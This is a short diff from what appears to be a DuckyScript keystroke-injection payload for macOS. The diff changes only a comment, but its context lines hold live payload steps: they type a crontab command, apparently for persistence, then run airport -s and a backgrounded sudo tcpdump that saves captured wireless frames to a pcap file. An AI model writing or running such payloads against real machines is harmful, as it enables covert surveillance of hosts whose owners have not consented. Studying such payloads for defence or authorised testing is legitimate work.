@@ -49,7 +49,7 @@ STRING crontab cronjob
 ENTER
 DELAY 1000
 REM Execute airport -s command to list available Wi-Fi networks, print the SSIDs, and dump the packets of the host to a file. 
-REM we use the '-w' in place of the > operator here because '>' gives sends a pcap that wireshark cannot read , '-w' resolves the issue.
+REM we use the '-w' in place of the '>' operator here because '>' gives sends a pcap that wireshark cannot read , '-w' resolves the issue.
 STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s; sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x08' -w infinitydump.pcap &
 ENTER
 DELAY 60000
